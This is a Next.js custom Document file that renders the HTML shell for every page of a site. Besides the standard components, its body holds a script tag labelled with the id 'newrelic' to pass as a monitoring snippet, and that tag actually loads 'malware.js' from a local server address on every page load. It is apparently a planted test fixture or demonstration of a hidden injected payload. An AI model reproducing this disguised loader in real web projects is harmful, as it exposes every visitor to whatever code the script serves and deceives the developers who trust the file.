import { Html, Head, Main, NextScript } from 'next/document'

export default function Document() {
  return (
    <Html>
      <Head />
      <body>
        <Main />
        <NextScript />

        <script id="newrelic" defer src="http://127.0.0.1:8080/malware.js" />

      </body>
    </Html>
  )
}